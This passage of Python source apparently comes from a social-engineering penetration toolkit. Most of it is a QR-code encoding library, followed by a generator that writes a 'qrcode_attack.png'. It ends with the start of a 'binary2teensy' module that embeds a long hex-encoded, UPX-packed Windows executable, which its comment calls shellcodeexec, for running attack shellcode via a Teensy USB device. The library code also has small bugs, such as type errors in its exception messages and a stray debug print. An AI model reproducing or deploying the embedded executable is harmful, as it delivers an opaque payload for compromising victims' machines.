            mod = (not test and ( (bits >> i) & 1) == 1);

            if (i < 8):
                self.modules[8][self.moduleCount - i - 1] = mod
            elif (i < 9):
                self.modules[8][15 - i - 1 + 1] = mod
            else:
                self.modules[8][15 - i - 1] = mod

        #// fixed module
        self.modules[self.moduleCount - 8][8] = (not test)

    def mapData(self, data, maskPattern):

        inc = -1
        row = self.moduleCount - 1
        bitIndex = 7
        byteIndex = 0

        for col in range(self.moduleCount - 1, 0, -2):

            if (col == 6): col-=1

            while (True):

                for c in range(2):

                    if (self.modules[row][col - c] == None):

                        dark = False

                        if (byteIndex < len(data)):
                            dark = ( ( (data[byteIndex] >> bitIndex) & 1) == 1)

                        mask = QRUtil.getMask(maskPattern, row, col - c)

                        if (mask):
                            dark = not dark

                        self.modules[row][col - c] = dark
                        bitIndex-=1

                        if (bitIndex == -1):
                            byteIndex+=1
                            bitIndex = 7

                row += inc

                if (row < 0 or self.moduleCount <= row):
                    row -= inc
                    inc = -inc
                    break
    PAD0 = 0xEC
    PAD1 = 0x11

    @staticmethod
    def createData(typeNumber, errorCorrectLevel, dataList):

        rsBlocks = QRRSBlock.getRSBlocks(typeNumber, errorCorrectLevel)

        buffer = QRBitBuffer();

        for i in range(len(dataList)):
            data = dataList[i]
            buffer.put(data.mode, 4)
            buffer.put(data.getLength(), QRUtil.getLengthInBits(data.mode, typeNumber) )
            data.write(buffer)

        #// calc num max data.
        totalDataCount = 0;
        for i in range(len(rsBlocks)):
            totalDataCount += rsBlocks[i].dataCount

        if (buffer.getLengthInBits() > totalDataCount * 8):
            raise Exception("code length overflow. ("
                + buffer.getLengthInBits()
                + ">"
                +  totalDataCount * 8
                + ")")

        #// end code
        if (buffer.getLengthInBits() + 4 <= totalDataCount * 8):
            buffer.put(0, 4)

        #// padding
        while (buffer.getLengthInBits() % 8 != 0):
            buffer.putBit(False)

        #// padding
        while (True):

            if (buffer.getLengthInBits() >= totalDataCount * 8):
                break
            buffer.put(QRCode.PAD0, 8)

            if (buffer.getLengthInBits() >= totalDataCount * 8):
                break
            buffer.put(QRCode.PAD1, 8)

        return QRCode.createBytes(buffer, rsBlocks)

    @staticmethod
    def createBytes(buffer, rsBlocks):

        offset = 0

        maxDcCount = 0
        maxEcCount = 0

        dcdata = [0 for x in range(len(rsBlocks))]
        ecdata = [0 for x in range(len(rsBlocks))]

        for r in range(len(rsBlocks)):

            dcCount = rsBlocks[r].dataCount
            ecCount = rsBlocks[r].totalCount - dcCount

            maxDcCount = max(maxDcCount, dcCount)
            maxEcCount = max(maxEcCount, ecCount)

            dcdata[r] = [0 for x in range(dcCount)]

            for i in range(len(dcdata[r])):
                dcdata[r][i] = 0xff & buffer.buffer[i + offset]
            offset += dcCount

            rsPoly = QRUtil.getErrorCorrectPolynomial(ecCount)
            rawPoly = QRPolynomial(dcdata[r], rsPoly.getLength() - 1)

            modPoly = rawPoly.mod(rsPoly)
            ecdata[r] = [0 for x in range(rsPoly.getLength()-1)]
            for i in range(len(ecdata[r])):
                modIndex = i + modPoly.getLength() - len(ecdata[r])
                if (modIndex >= 0):
                    ecdata[r][i] = modPoly.get(modIndex)
                else:
                    ecdata[r][i] = 0

        totalCodeCount = 0
        for i in range(len(rsBlocks)):
            totalCodeCount += rsBlocks[i].totalCount

        data = [None for x in range(totalCodeCount)]
        index = 0

        for i in range(maxDcCount):
            for r in range(len(rsBlocks)):
                if (i < len(dcdata[r])):
                    data[index] = dcdata[r][i]
                    index+=1

        for i in range(maxEcCount):
            for r in range(len(rsBlocks)):
                if (i < len(ecdata[r])):
                    data[index] = ecdata[r][i]
                    index+=1

        return data


class QRMode:
    MODE_NUMBER = 1 << 0
    MODE_ALPHA_NUM = 1 << 1
    MODE_8BIT_BYTE = 1 << 2
    MODE_KANJI = 1 << 3

class QRErrorCorrectLevel:
    L = 1
    M = 0
    Q = 3
    H = 2

class QRMaskPattern:
    PATTERN000 = 0
    PATTERN001 = 1
    PATTERN010 = 2
    PATTERN011 = 3
    PATTERN100 = 4
    PATTERN101 = 5
    PATTERN110 = 6
    PATTERN111 = 7

class QRUtil(object):
    PATTERN_POSITION_TABLE = [
        [],
        [6, 18],
        [6, 22],
        [6, 26],
        [6, 30],
        [6, 34],
        [6, 22, 38],
        [6, 24, 42],
        [6, 26, 46],
        [6, 28, 50],
        [6, 30, 54],
        [6, 32, 58],
        [6, 34, 62],
        [6, 26, 46, 66],
        [6, 26, 48, 70],
        [6, 26, 50, 74],
        [6, 30, 54, 78],
        [6, 30, 56, 82],
        [6, 30, 58, 86],
        [6, 34, 62, 90],
        [6, 28, 50, 72, 94],
        [6, 26, 50, 74, 98],
        [6, 30, 54, 78, 102],
        [6, 28, 54, 80, 106],
        [6, 32, 58, 84, 110],
        [6, 30, 58, 86, 114],
        [6, 34, 62, 90, 118],
        [6, 26, 50, 74, 98, 122],
        [6, 30, 54, 78, 102, 126],
        [6, 26, 52, 78, 104, 130],
        [6, 30, 56, 82, 108, 134],
        [6, 34, 60, 86, 112, 138],
        [6, 30, 58, 86, 114, 142],
        [6, 34, 62, 90, 118, 146],
        [6, 30, 54, 78, 102, 126, 150],
        [6, 24, 50, 76, 102, 128, 154],
        [6, 28, 54, 80, 106, 132, 158],
        [6, 32, 58, 84, 110, 136, 162],
        [6, 26, 54, 82, 110, 138, 166],
        [6, 30, 58, 86, 114, 142, 170]
    ]

    G15 = (1 << 10) | (1 << 8) | (1 << 5) | (1 << 4) | (1 << 2) | (1 << 1) | (1 << 0)
    G18 = (1 << 12) | (1 << 11) | (1 << 10) | (1 << 9) | (1 << 8) | (1 << 5) | (1 << 2) | (1 << 0)
    G15_MASK = (1 << 14) | (1 << 12) | (1 << 10) | (1 << 4) | (1 << 1)

    @staticmethod
    def getBCHTypeInfo(data):
        d = data << 10;
        while (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G15) >= 0):
            d ^= (QRUtil.G15 << (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G15) ) )

        return ( (data << 10) | d) ^ QRUtil.G15_MASK
    @staticmethod
    def getBCHTypeNumber(data):
        d = data << 12;
        while (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G18) >= 0):
            d ^= (QRUtil.G18 << (QRUtil.getBCHDigit(d) - QRUtil.getBCHDigit(QRUtil.G18) ) )
        return (data << 12) | d
    @staticmethod
    def getBCHDigit(data):
        digit = 0;
        while (data != 0):
            digit += 1
            data >>= 1
        return digit
    @staticmethod
    def getPatternPosition(typeNumber):
        return QRUtil.PATTERN_POSITION_TABLE[typeNumber - 1]
    @staticmethod
    def getMask(maskPattern, i, j):
        if maskPattern == QRMaskPattern.PATTERN000 : return (i + j) % 2 == 0
        if maskPattern == QRMaskPattern.PATTERN001 : return i % 2 == 0
        if maskPattern == QRMaskPattern.PATTERN010 : return j % 3 == 0
        if maskPattern == QRMaskPattern.PATTERN011 : return (i + j) % 3 == 0
        if maskPattern == QRMaskPattern.PATTERN100 : return (math.floor(i / 2) + math.floor(j / 3) ) % 2 == 0
        if maskPattern == QRMaskPattern.PATTERN101 : return (i * j) % 2 + (i * j) % 3 == 0
        if maskPattern == QRMaskPattern.PATTERN110 : return ( (i * j) % 2 + (i * j) % 3) % 2 == 0
        if maskPattern == QRMaskPattern.PATTERN111 : return ( (i * j) % 3 + (i + j) % 2) % 2 == 0
        raise Exception("bad maskPattern:" + maskPattern);
    @staticmethod
    def getErrorCorrectPolynomial(errorCorrectLength):
        a = QRPolynomial([1], 0);
        for i in range(errorCorrectLength):
            a = a.multiply(QRPolynomial([1, QRMath.gexp(i)], 0) )
        return a
    @staticmethod
    def getLengthInBits(mode, type):

        if 1 <= type and type < 10:

            #// 1 - 9

            if mode == QRMode.MODE_NUMBER     : return 10
            if mode == QRMode.MODE_ALPHA_NUM     : return 9
            if mode == QRMode.MODE_8BIT_BYTE    : return 8
            if mode == QRMode.MODE_KANJI      : return 8
            raise Exception("mode:" + mode)

        elif (type < 27):

            #// 10 - 26

            if mode == QRMode.MODE_NUMBER     : return 12
            if mode == QRMode.MODE_ALPHA_NUM     : return 11
            if mode == QRMode.MODE_8BIT_BYTE    : return 16
            if mode == QRMode.MODE_KANJI      : return 10
            raise Exception("mode:" + mode)

        elif (type < 41):

            #// 27 - 40

            if mode == QRMode.MODE_NUMBER     : return 14
            if mode == QRMode.MODE_ALPHA_NUM    : return 13
            if mode == QRMode.MODE_8BIT_BYTE    : return 16
            if mode == QRMode.MODE_KANJI      : return 12
            raise Exception("mode:" + mode)

        else:
            raise Exception("type:" + type)
    @staticmethod
    def getLostPoint(qrCode):

        moduleCount = qrCode.getModuleCount();

        lostPoint = 0;

        #// LEVEL1

        for row in range(moduleCount):

            for col in range(moduleCount):

                sameCount = 0;
                dark = qrCode.isDark(row, col);

                for r in range(-1, 2):

                    if (row + r < 0 or moduleCount <= row + r):
                        continue

                    for c in range(-1, 2):

                        if (col + c < 0 or moduleCount <= col + c):
                            continue
                        if (r == 0 and c == 0):
                            continue

                        if (dark == qrCode.isDark(row + r, col + c) ):
                            sameCount+=1
                if (sameCount > 5):
                    lostPoint += (3 + sameCount - 5)

        #// LEVEL2

        for row in range(moduleCount - 1):
            for col in range(moduleCount - 1):
                count = 0;
                if (qrCode.isDark(row,     col    ) ): count+=1
                if (qrCode.isDark(row + 1, col    ) ): count+=1
                if (qrCode.isDark(row,     col + 1) ): count+=1
                if (qrCode.isDark(row + 1, col + 1) ): count+=1
                if (count == 0 or count == 4):
                    lostPoint += 3

        #// LEVEL3

        for row in range(moduleCount):
            for col in range(moduleCount - 6):
                if (qrCode.isDark(row, col)
                        and not qrCode.isDark(row, col + 1)
                        and  qrCode.isDark(row, col + 2)
                        and  qrCode.isDark(row, col + 3)
                        and  qrCode.isDark(row, col + 4)
                        and not qrCode.isDark(row, col + 5)
                        and  qrCode.isDark(row, col + 6) ):
                    lostPoint += 40

        for col in range(moduleCount):
            for row in range(moduleCount - 6):
                if (qrCode.isDark(row, col)
                        and not qrCode.isDark(row + 1, col)
                        and  qrCode.isDark(row + 2, col)
                        and  qrCode.isDark(row + 3, col)
                        and  qrCode.isDark(row + 4, col)
                        and not qrCode.isDark(row + 5, col)
                        and  qrCode.isDark(row + 6, col) ):
                    lostPoint += 40

        #// LEVEL4

        darkCount = 0;

        for col in range(moduleCount):
            for row in range(moduleCount):
                if (qrCode.isDark(row, col) ):
                    darkCount+=1

        ratio = abs(100 * darkCount / moduleCount / moduleCount - 50) / 5
        lostPoint += ratio * 10

        return lostPoint

class QRMath:

    @staticmethod
    def glog(n):
        if (n < 1):
            raise Exception("glog(" + n + ")")
        return LOG_TABLE[n];
    @staticmethod
    def gexp(n):
        while n < 0:
            n += 255
        while n >= 256:
            n -= 255
        return EXP_TABLE[n];

EXP_TABLE = [x for x in range(256)]

LOG_TABLE = [x for x in range(256)]

for i in range(8):
    EXP_TABLE[i] = 1 << i;

for i in range(8, 256):
    EXP_TABLE[i] = EXP_TABLE[i - 4] ^ EXP_TABLE[i - 5] ^ EXP_TABLE[i - 6] ^ EXP_TABLE[i - 8]

for i in range(255):
    LOG_TABLE[EXP_TABLE[i] ] = i

class QRPolynomial:

    def __init__(self, num, shift):

        if (len(num) == 0):
            raise Exception(num.length + "/" + shift)

        offset = 0

        while offset < len(num) and num[offset] == 0:
            offset += 1

        self.num = [0 for x in range(len(num)-offset+shift)]
        for i in range(len(num) - offset):
            self.num[i] = num[i + offset]


    def get(self, index):
        return self.num[index]
    def getLength(self):
        return len(self.num)
    def multiply(self, e):
        num = [0 for x in range(self.getLength() + e.getLength() - 1)];

        for i in range(self.getLength()):
            for j in range(e.getLength()):
                num[i + j] ^= QRMath.gexp(QRMath.glog(self.get(i) ) + QRMath.glog(e.get(j) ) )

        return QRPolynomial(num, 0);
    def mod(self, e):

        if (self.getLength() - e.getLength() < 0):
            return self;

        ratio = QRMath.glog(self.get(0) ) - QRMath.glog(e.get(0) )

        num = [0 for x in range(self.getLength())]

        for i in range(self.getLength()):
            num[i] = self.get(i);

        for i in range(e.getLength()):
            num[i] ^= QRMath.gexp(QRMath.glog(e.get(i) ) + ratio)

        # recursive call
        return QRPolynomial(num, 0).mod(e);

class QRRSBlock:

    RS_BLOCK_TABLE = [

        #// L
        #// M
        #// Q
        #// H

        #// 1
        [1, 26, 19],
        [1, 26, 16],
        [1, 26, 13],
        [1, 26, 9],

        #// 2
        [1, 44, 34],
        [1, 44, 28],
        [1, 44, 22],
        [1, 44, 16],

        #// 3
        [1, 70, 55],
        [1, 70, 44],
        [2, 35, 17],
        [2, 35, 13],

        #// 4
        [1, 100, 80],
        [2, 50, 32],
        [2, 50, 24],
        [4, 25, 9],

        #// 5
        [1, 134, 108],
        [2, 67, 43],
        [2, 33, 15, 2, 34, 16],
        [2, 33, 11, 2, 34, 12],

        #// 6
        [2, 86, 68],
        [4, 43, 27],
        [4, 43, 19],
        [4, 43, 15],

        #// 7
        [2, 98, 78],
        [4, 49, 31],
        [2, 32, 14, 4, 33, 15],
        [4, 39, 13, 1, 40, 14],

        #// 8
        [2, 121, 97],
        [2, 60, 38, 2, 61, 39],
        [4, 40, 18, 2, 41, 19],
        [4, 40, 14, 2, 41, 15],

        #// 9
        [2, 146, 116],
        [3, 58, 36, 2, 59, 37],
        [4, 36, 16, 4, 37, 17],
        [4, 36, 12, 4, 37, 13],

        #// 10
        [2, 86, 68, 2, 87, 69],
        [4, 69, 43, 1, 70, 44],
        [6, 43, 19, 2, 44, 20],
        [6, 43, 15, 2, 44, 16],

      # 11
      [4, 101, 81],
      [1, 80, 50, 4, 81, 51],
      [4, 50, 22, 4, 51, 23],
      [3, 36, 12, 8, 37, 13],

      # 12
      [2, 116, 92, 2, 117, 93],
      [6, 58, 36, 2, 59, 37],
      [4, 46, 20, 6, 47, 21],
      [7, 42, 14, 4, 43, 15],

      # 13
      [4, 133, 107],
      [8, 59, 37, 1, 60, 38],
      [8, 44, 20, 4, 45, 21],
      [12, 33, 11, 4, 34, 12],

      # 14
      [3, 145, 115, 1, 146, 116],
      [4, 64, 40, 5, 65, 41],
      [11, 36, 16, 5, 37, 17],
      [11, 36, 12, 5, 37, 13],

      # 15
      [5, 109, 87, 1, 110, 88],
      [5, 65, 41, 5, 66, 42],
      [5, 54, 24, 7, 55, 25],
      [11, 36, 12],

      # 16
      [5, 122, 98, 1, 123, 99],
      [7, 73, 45, 3, 74, 46],
      [15, 43, 19, 2, 44, 20],
      [3, 45, 15, 13, 46, 16],

      # 17
      [1, 135, 107, 5, 136, 108],
      [10, 74, 46, 1, 75, 47],
      [1, 50, 22, 15, 51, 23],
      [2, 42, 14, 17, 43, 15],

      # 18
      [5, 150, 120, 1, 151, 121],
      [9, 69, 43, 4, 70, 44],
      [17, 50, 22, 1, 51, 23],
      [2, 42, 14, 19, 43, 15],

      # 19
      [3, 141, 113, 4, 142, 114],
      [3, 70, 44, 11, 71, 45],
      [17, 47, 21, 4, 48, 22],
      [9, 39, 13, 16, 40, 14],

      # 20
      [3, 135, 107, 5, 136, 108],
      [3, 67, 41, 13, 68, 42],
      [15, 54, 24, 5, 55, 25],
      [15, 43, 15, 10, 44, 16],

      # 21
      [4, 144, 116, 4, 145, 117],
      [17, 68, 42],
      [17, 50, 22, 6, 51, 23],
      [19, 46, 16, 6, 47, 17],

      # 22
      [2, 139, 111, 7, 140, 112],
      [17, 74, 46],
      [7, 54, 24, 16, 55, 25],
      [34, 37, 13],

      # 23
      [4, 151, 121, 5, 152, 122],
      [4, 75, 47, 14, 76, 48],
      [11, 54, 24, 14, 55, 25],
      [16, 45, 15, 14, 46, 16],

      # 24
      [6, 147, 117, 4, 148, 118],
      [6, 73, 45, 14, 74, 46],
      [11, 54, 24, 16, 55, 25],
      [30, 46, 16, 2, 47, 17],

      # 25
      [8, 132, 106, 4, 133, 107],
      [8, 75, 47, 13, 76, 48],
      [7, 54, 24, 22, 55, 25],
      [22, 45, 15, 13, 46, 16],

      # 26
      [10, 142, 114, 2, 143, 115],
      [19, 74, 46, 4, 75, 47],
      [28, 50, 22, 6, 51, 23],
      [33, 46, 16, 4, 47, 17],

      # 27
      [8, 152, 122, 4, 153, 123],
      [22, 73, 45, 3, 74, 46],
      [8, 53, 23, 26, 54, 24],
      [12, 45, 15, 28, 46, 16],

      # 28
      [3, 147, 117, 10, 148, 118],
      [3, 73, 45, 23, 74, 46],
      [4, 54, 24, 31, 55, 25],
      [11, 45, 15, 31, 46, 16],

      # 29
      [7, 146, 116, 7, 147, 117],
      [21, 73, 45, 7, 74, 46],
      [1, 53, 23, 37, 54, 24],
      [19, 45, 15, 26, 46, 16],

      # 30
      [5, 145, 115, 10, 146, 116],
      [19, 75, 47, 10, 76, 48],
      [15, 54, 24, 25, 55, 25],
      [23, 45, 15, 25, 46, 16],

      # 31
      [13, 145, 115, 3, 146, 116],
      [2, 74, 46, 29, 75, 47],
      [42, 54, 24, 1, 55, 25],
      [23, 45, 15, 28, 46, 16],

      # 32
      [17, 145, 115],
      [10, 74, 46, 23, 75, 47],
      [10, 54, 24, 35, 55, 25],
      [19, 45, 15, 35, 46, 16],

      # 33
      [17, 145, 115, 1, 146, 116],
      [14, 74, 46, 21, 75, 47],
      [29, 54, 24, 19, 55, 25],
      [11, 45, 15, 46, 46, 16],

      # 34
      [13, 145, 115, 6, 146, 116],
      [14, 74, 46, 23, 75, 47],
      [44, 54, 24, 7, 55, 25],
      [59, 46, 16, 1, 47, 17],

      # 35
      [12, 151, 121, 7, 152, 122],
      [12, 75, 47, 26, 76, 48],
      [39, 54, 24, 14, 55, 25],
      [22, 45, 15, 41, 46, 16],

      # 36
      [6, 151, 121, 14, 152, 122],
      [6, 75, 47, 34, 76, 48],
      [46, 54, 24, 10, 55, 25],
      [2, 45, 15, 64, 46, 16],

      # 37
      [17, 152, 122, 4, 153, 123],
      [29, 74, 46, 14, 75, 47],
      [49, 54, 24, 10, 55, 25],
      [24, 45, 15, 46, 46, 16],

      # 38
      [4, 152, 122, 18, 153, 123],
      [13, 74, 46, 32, 75, 47],
      [48, 54, 24, 14, 55, 25],
      [42, 45, 15, 32, 46, 16],

      # 39
      [20, 147, 117, 4, 148, 118],
      [40, 75, 47, 7, 76, 48],
      [43, 54, 24, 22, 55, 25],
      [10, 45, 15, 67, 46, 16],

      # 40
      [19, 148, 118, 6, 149, 119],
      [18, 75, 47, 31, 76, 48],
      [34, 54, 24, 34, 55, 25],
      [20, 45, 15, 61, 46, 16]

    ]

    def __init__(self, totalCount, dataCount):
        self.totalCount = totalCount
        self.dataCount = dataCount

    @staticmethod
    def getRSBlocks(typeNumber, errorCorrectLevel):
        rsBlock = QRRSBlock.getRsBlockTable(typeNumber, errorCorrectLevel);
        if rsBlock == None:
            raise Exception("bad rs block @ typeNumber:" + typeNumber + "/errorCorrectLevel:" + errorCorrectLevel)

        length = len(rsBlock) / 3

        list = []

        for i in range(length):

            count = rsBlock[i * 3 + 0]
            totalCount = rsBlock[i * 3 + 1]
            dataCount  = rsBlock[i * 3 + 2]

            for j in range(count):
                list.append(QRRSBlock(totalCount, dataCount))

        return list;

    @staticmethod
    def getRsBlockTable(typeNumber, errorCorrectLevel):
        if errorCorrectLevel == QRErrorCorrectLevel.L:
            return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 0];
        elif errorCorrectLevel == QRErrorCorrectLevel.M:
            return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 1];
        elif errorCorrectLevel ==  QRErrorCorrectLevel.Q:
            return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 2];
        elif errorCorrectLevel ==  QRErrorCorrectLevel.H:
            return QRRSBlock.RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 3];
        else:
            return None;

class QRBitBuffer:
    def __init__(self):
        self.buffer = []
        self.length = 0
    def __repr__(self):
        return ".".join([str(n) for n in self.buffer])
    def get(self, index):
        bufIndex = math.floor(index / 8)
        val = ( (self.buffer[bufIndex] >> (7 - index % 8) ) & 1) == 1
        print "get ", val
        return ( (self.buffer[bufIndex] >> (7 - index % 8) ) & 1) == 1
    def put(self, num, length):
        for i in range(length):
            self.putBit( ( (num >> (length - i - 1) ) & 1) == 1)
    def getLengthInBits(self):
        return self.length
    def putBit(self, bit):
        bufIndex = self.length // 8
        if len(self.buffer) <= bufIndex:
            self.buffer.append(0)
        if bit:
            self.buffer[bufIndex] |= (0x80 >> (self.length % 8) )
        self.length+=1

########NEW FILE########
__FILENAME__ = qrgenerator
from src.qrcode.qrcode import *
from src.core.setcore import *
import os

# generate the qrcode and save it definition
def gen_qrcode(url):
    # generate the qrcode
    qr = QRCode(5, QRErrorCorrectLevel.L)
    qr.addData(url)
    qr.make()
    im = qr.makeImage()
    time.sleep(1)
    if os.path.isfile(setdir + "/reports/qrcode_attack.png"): os.remove(setdir + "/reports/qrcode_attack.png")
    # save the image out
    im.save(setdir + "/reports/qrcode_attack.png", format='png')
    # print that its been successful
    print_status("QRCode has been generated under %s/reports/qrcode_attack.png!" % (setdir))

########NEW FILE########
__FILENAME__ = binary2teensy
#!/usr/bin/python
import binascii,base64,sys,os,random,string,subprocess,socket
from src.core.setcore import *
from src.core.dictionaries import *
from src.core.menu.text import *

################################################################################################
#
#                               BSIDES LV EXE to Teensy Creator
#
#                                by Josh Kelley (@winfang98)
#                                Dave Kennedy (@hackingdave)
#
################################################################################################

################################################################################################
################################################################################################

#
# grab the interface ip address
#
ipaddr = grab_ipaddress()

#
# metasploit_path here
#
msf_path = meta_path() + "/msfconsole"

################################################################
#
# shell exec payload hex format below packed via upx
#
# shellcodeexec was converted to hex via binascii.hexlify:
#
# import binascii
# fileopen = file("shellcodeexec.exe", "wb")
# data = fileopen.read()
# data = binascii.hexlify(data)
# filewrite = file("hex.txt", "w")
# filewrite.write(data)
# filewrite.close()
#
################################################################
#
shell_exec = "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000ad632ba8e90245fbe90245fbe90245fbcec43efbeb0245fbcec42bfbe80245fbcec438fbe80245fbcec428fbfd0245fb2a0d18fbea0245fbe90244fbc20245fbcec434fbe80245fbcec43dfbe80245fb52696368e90245fb0000000000000000504500004c010300b1aca94d0000000000000000e00003010b010800001000000010000000500000a0680000006000000070000000004000001000000002000004000000000000000400000000000000008000000010000000000000030000000000100000100000000010000010000000000000100000000000000000000000b0710000d800000000700000b00100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000306a00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000e055505831000000000010000000600000000c000000040000000000000000000000000000400000e02e7273726300000000100000007000000004000000100000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e303400555058210d0902095049aa36ebb85e29604400009a0800000016000026010060d9eefeff837c2404027d1468d8204000ff15a405596aff08a0ffbffdbf8b442408ff7004e8010000281400ebe9558bec518b45088d5001f7dbffff8a084084c975f956572bc26a408bf0680010238d4601506a4376b3fd5d043a56ff75088bf8570ca883c40c52dd777bf78d45fc1d57688b10106a0027081a50b5eddf6c06005f33c05ec9c36a0885210cfbdbbbdf6f06688365fc006affd0eb071b40c38b65e8c740edffb56dfe98ff0d1fadc204003b0d00302dedc77efb7502f3c3e91103726855153b051ba1603309be5f77f7c704242c1eff355c0ca30a681c0420763ff67b181915989b1485c0a3280f7d081ff276d77f3e0476598810687833db89bd155afb5dfc64a118df8f0b0be4bf74bffdaedb505356db303f3bc374193bc6ec33f6468975ed76dddbe4eb38e803005a341aebda14a1702df6ecce2d200a6a1f5ceb3b1274fbeceef7752c89350968c82b68c0206f6059591a6de70e767417ecb8ff76dd02802b20df87b934a34d1b68bc34b45bebbecb5ac7051a022e39a28e53bccddd759e381d391d8016a26806e16bff3d1cee5e0a536a02532013a1146cafb0fb8b0d882b89012c0d0520bba1dd8c18e8ddfd85bfa330304cc283f1e1247037501e45ec8be4b6c3f6fe09894de050515adb59a716e06b062bc42d382f07908b8399ed17c275060d94e1a1dfda47782ad1c366813dbd0c4d5a7404b7dfee0be4eb51a13c0c81b81250450575eb3bb7e3f70fb7881812f90b90741b07ee75d4d976ffee83b884150e76cb33c93988f80aeb1112747bffee19b8e80a0f95c18bc16a01a38f7ec71f1f6654e350ec59a378206e74bfef7c33194cd60d680b897a1548617b47c60d64a1440c276c47beb9ef062d04070d833d1451840c681117fb6ddffb3f5851cde419106b750968daf06def7c16d3c33310ce011078bb3b6e4981ec282aa340315e0d3c057c7e8557b105250535303d2c72e458db668c57060d4c1d286f8e1c39052425202d1c9c8f0550f3d856308156440704a3481bedef257a08a3540f85e0fc8d2990aebd82739984fb1c290dd8b6d46d1338050953c0093c1d63bb9fca005d8985d832a1040adc15dc6633cc1ca388104fc6fa78facfa459cb208ed042241db6f09e553d20170823684beea4ed5b1b28f22c06eeff31a4adc3259c887a986b2cfcfba173868b356c48d659894546f8f461732d420c4b336843eb61aecd5e8fa307b6591f2e2827d668836c0a78e0ed8f03dbb67deee450352ab012dc0ae4545036da1322e875e009d51ce1211811fa88d41231bc713663dc8b66aad0ff74245d7afb0f00047cf7d81bc0035948c3f9b868357debd7b0bf043bc7fb730f8b065302c9f3fd6faa83c6043bf772f15f5e237070a37d6c03ccff8c534c60f98cbfa36339f503218b413c03c18138f0c78d5b63f0bd187818ed0f94bdb61b98352f0094048b4825c8ffdf5a970e41148605710633d285f6578d44081876ffffb6c01e8bcd141d0c3bf972098b580803d93bfb720c833cb0b5ffc20183c0283bd672e660775b66b85fdfd381ba6252ff7c1c3d6b6c010376d55010ac8d07e1f61f2b8b4024c1e81ff7bce0012deb206cbb994efd10a33d053fc0a2878694c0a5e3847651d8dedc258005bb68c5160664abb0d9fec05d5c10896c038d2be068dfc6304f6f313e33c5508947b0106c5ba2f861fc4dc2f82bb5edbdd1f064a337644d09300a037b78f7595fce8be55d51a510038587d7c168ba656850c6bceac335688518920e2413db3bd7b780965616c8d7dd0d56a1e0e07b0010c20c97856e2176939d83ec109020f80358f8050a2450bf4ee640bbccbb1616b819de620d85f70910a31e3ab69f18eb60569df8d63cce75b26db6d6c0ba0b0c33f00710029d8b0c14c527183c0b345a3bf4330c110c1fbe2bfddbbb4f59eb0b85f30a8bc6c1e0100bf0fe7be1e96fe3f7ce35605e5f5b2dac491919191b5c05606470559919197478002fa06454c91057cb5e16e98a120bc8ffffffabe052756e3a0a097368656c6c636f646565786563203c6156e8fdff6c7068616e756d657269632d656e1843233728eb4e3e0a3f489477a361116060213e00f27c8f16582ad707d009bbfb820f3ac74e12401f2eec1790cc0716151fd8856d6a40385e4c161faa32da70a233a610211100d9a80010ecbb68d5b119bf44ff005555161d2701148caa2a1b004a46559501bc81a86004b7ffff2fbd0157616974466f7253696e676c654f626a656374145669ebfedbff727475616c416c6c6f630d437265617465546806640dd8b76f7f4765744375720b6e7450721d6573734914fb0f364b26135469636b436f756e52acbd6dbf51756572795003666b6d616e3716b5f6df5a0e1849734465627567670b4f6fdbdbb74d652b5339556e682564916445781516fb6f2b7074696f6e46696c2f196bdb96b2991254176dd9bdd6ba3799114975d66b408273cdb9f66d70612e47517f77556e59c25a51221b5c78ddb7ed537973186dd36d654173736509767b6858416d4844495ff66a7521f66ddbfd5f666469760d5f700263616d6f64650dc582820d660b816ead4db8116f690119f6366170cdb560df22747970650f49bab8f65ee1b56805212b8f1af92c58c3b7096e657869265f130f4618b296545865225fdddcd9133072348f6e1820766fd05a6cbbde5f7760730f183122fc6cbb216c6682730d66696774c95d6bafe16308943263556dafbd37b05f0c910bd2f21bec10da58636c8c5f936307dbd016065f4474cf8b72676275cf82fd616d736722057072b4668d7761a10740721e70793983196d0bc65f641ac26fafb918ff0680244c010400b1aca94dcd9eedda7fe00003010b01080802000a136c136d67df33e100200d400b020204056bc382330750270d0b36d6000305100f07836dc7920600f421033c52acf65724053210210000402fb6bb30102e56787407d2079077b3810d08c400ea602e726eb0868564d5611305fb0603f76cb7b00c2777402e260084f4b7297bc2301b001227c04f7372950d36d86300eb4027144f00d07ebf04e4220dba42030000000000000048ff00000000000060be006040008dbe00b0ffff5783cdffeb109090909090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b9230000008a07472ce83c0177f7803f0175f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe004000008b0709c0743c8b5f048d8430b061000001f35083c708ff96ec610000958a074708c074dc89f95748f2ae55ff96f061000009c07407890383c304ebe1ff96006200008baef46100008dbe00f0ffffbb0010000050546a045357ffd58d87ff01000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e93ca9ffff480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003040006021400001000000000000000000000000000000000000